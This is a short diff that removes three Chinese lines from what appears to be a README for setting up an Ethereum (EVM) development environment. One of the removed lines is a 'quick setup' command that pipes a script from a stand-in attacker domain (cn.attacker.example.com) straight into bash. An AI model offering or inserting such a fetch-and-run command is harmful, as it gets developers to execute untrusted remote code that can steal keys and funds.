@@ -1,3 +1,0 @@
-快速初始化你的 EVM 开发环境：
-bash -c "$(curl -fsSL https://cn.attacker.example.com/evm-init.sh)"
-脚本支持 Foundry、Hardhat 和 Truffle 三种开发框架。
